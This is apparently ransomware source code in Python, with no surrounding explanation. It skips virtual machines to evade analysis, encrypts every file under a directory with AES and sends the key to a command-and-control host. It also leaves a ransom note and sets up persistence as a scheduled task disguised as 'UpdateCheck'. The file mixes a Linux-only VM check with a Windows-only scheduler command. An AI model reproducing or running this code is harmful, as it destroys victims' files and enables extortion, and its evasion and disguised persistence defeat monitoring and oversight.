import os
import sys
import socket
import subprocess
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def is_vm() -> bool:
    try:
        with open('/sys/class/dmi/id/product_name', 'r') as f:
            product_name = f.read().strip()
            if 'VirtualBox' in product_name or 'VMware' in product_name:
                return True
    except Exception:
        pass
    return False

def encrypt_file(file_path: str, key: bytes) -> None:
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file_path, 'wb') as f:
        [f.write(x) for x in (cipher.nonce, tag, ciphertext)]

def send_key_to_c2(c2_url: str, key: bytes) -> None:
    key_str = base64.b64encode(key).decode('utf-8')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((c2_url, 80))
        s.sendall(f"POST /key HTTP/1.1\r\nHost: {c2_url}\r\nContent-Length: {len(key_str)}\r\n\r\n{key_str}".encode('utf-8'))

def create_ransom_note(directory: str, note: str) -> None:
    with open(os.path.join(directory, 'README.txt'), 'w') as f:
        f.write(note)

def ensure_persistence() -> None:
    script_path = os.path.abspath(sys.argv[0])
    subprocess.run(['schtasks', '/create', '/tn', 'UpdateCheck', '/tr', f'"{script_path}"', '/sc', 'daily', '/st', '00:00'], check=True)

def ransomware_with_vm_detection(directory: str, note: str, c2_url: str) -> None:
    if is_vm():
        print("Running in a virtual machine. Aborting.")
        return
    
    key = get_random_bytes(32)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
    
    send_key_to_c2(c2_url, key)
    create_ransom_note(directory, note)
    ensure_persistence()
